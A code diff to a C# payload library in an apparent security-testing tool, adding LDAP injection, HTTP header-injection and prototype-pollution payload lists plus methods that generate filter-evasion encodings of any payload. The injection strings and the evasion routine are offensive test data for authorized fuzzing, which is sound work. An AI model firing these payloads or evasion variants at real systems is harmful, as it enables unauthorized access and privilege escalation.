@@ -1923,6 +1923,40 @@ public sealed class PayloadsApi
         "dict://127.0.0.1:11211/stat",
     ];
 
+    private static readonly IReadOnlyList<string> LdapPayloads =
+    [
+        "*",
+        "*)(uid=*))(|(uid=*",
+        "*)(|(objectclass=*))",
+        "admin*)((|userPassword=*)",
+        "*)(mail=*))%00",
+        ")(cn=*",
+        "*()|%26'",
+        "*)(|(password=*))",
+    ];
+
+    private static readonly IReadOnlyList<string> HeaderInjectionPayloads =
+    [
+        "value\r\nX-Injected: forrest",
+        "value\nX-Injected: forrest",
+        "value%0d%0aX-Injected:%20forrest",
+        "value%0aX-Injected:%20forrest",
+        "value\r\nSet-Cookie: forrest=injected",
+        "value\r\n\r\n<script>alert(1)</script>",
+        "value\tX-Injected: forrest",
+    ];
+
+    private static readonly IReadOnlyList<string> PrototypePollutionPayloads =
+    [
+        "{\"__proto__\":{\"polluted\":true}}",
+        "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
+        "{\"__proto__.polluted\":true}",
+        "__proto__[polluted]=true",
+        "constructor[prototype][polluted]=true",
+        "{\"__proto__\":{\"isAdmin\":true}}",
+        "{\"__proto__\":{\"toString\":\"polluted\"}}",
+    ];
+
     #endregion
 
     #region Constructors
@@ -1961,6 +1995,12 @@ public sealed class PayloadsApi
 
     public IReadOnlyList<string> Ssrf => SsrfPayloads;
 
+    public IReadOnlyList<string> Ldap => LdapPayloads;
+
+    public IReadOnlyList<string> HeaderInjection => HeaderInjectionPayloads;
+
+    public IReadOnlyList<string> PrototypePollution => PrototypePollutionPayloads;
+
     #endregion
 
     #region Public Methods
@@ -1997,6 +2037,9 @@ public sealed class PayloadsApi
             "nosqli" or "nosql" or "nosql_injection" => NoSqliPayloads,
             "crlf" or "crlf_injection" => CrlfInjectionPayloads,
             "ssrf" => SsrfPayloads,
+            "ldap" or "ldap_injection" => LdapPayloads,
+            "header_injection" or "header" or "response_splitting" => HeaderInjectionPayloads,
+            "prototype_pollution" or "proto" or "prototype" => PrototypePollutionPayloads,
             _ => [],
         };
     }
@@ -2059,6 +2102,9 @@ public sealed class PayloadsApi
             "nosqli",
             "crlf",
             "ssrf",
+            "ldap",
+            "header_injection",
+            "prototype_pollution",
         ];
 
         foreach (string custom in customCategories.Keys)
@@ -2070,6 +2116,65 @@ public sealed class PayloadsApi
         }
 
         return all;
+    }
+
+    /// <summary>
+    /// Expands a single payload into common WAF/filter-evasion variants:
+    /// the original, URL-encoded, double-URL-encoded, base64, upper-case, and
+    /// lower-case forms. Duplicates are removed while preserving order so a
+    /// fuzzer's first hit stays deterministic. Useful for breaking through naive
+    /// input filters during authorized testing.
+    /// </summary>
+    public IReadOnlyList<string> Mutate(string payload)
+    {
+        if (string.IsNullOrEmpty(payload))
+        {
+            return [];
+        }
+
+        List<string> output = [];
+        HashSet<string> seen = new(StringComparer.Ordinal);
+
+        void Add(string candidate)
+        {
+            if (!string.IsNullOrEmpty(candidate) && seen.Add(candidate))
+            {
+                output.Add(candidate);
+            }
+        }
+
+        Add(payload);
+        string urlEncoded = Uri.EscapeDataString(payload);
+        Add(urlEncoded);
+        Add(Uri.EscapeDataString(urlEncoded));
+        Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)));
+        Add(payload.ToUpperInvariant());
+        Add(payload.ToLowerInvariant());
+
+        return output;
+    }
+
+    /// <summary>
+    /// Mutates every payload in a category (or any supplied list) and flattens
+    /// the variants into one deduplicated corpus.
+    /// </summary>
+    public IReadOnlyList<string> MutateAll(IEnumerable<string> payloads)
+    {
+        List<string> output = [];
+        HashSet<string> seen = new(StringComparer.Ordinal);
+
+        foreach (string payload in payloads ?? [])
+        {
+            foreach (string variant in Mutate(payload))
+            {
+                if (seen.Add(variant))
+                {
+                    output.Add(variant);
+                }
+            }
+        }
+
+        return output;
     }
 
     #endregion
@@ -2238,6 +2343,8 @@ public sealed class ScriptGlobals
     public required RandomApi random { get; init; }
 
     public required PayloadsApi payloads { get; init; }
+
+    public required FuzzApi fuzz { get; init; }
 
     public required WorkspaceApi workspace { get; init; }
 
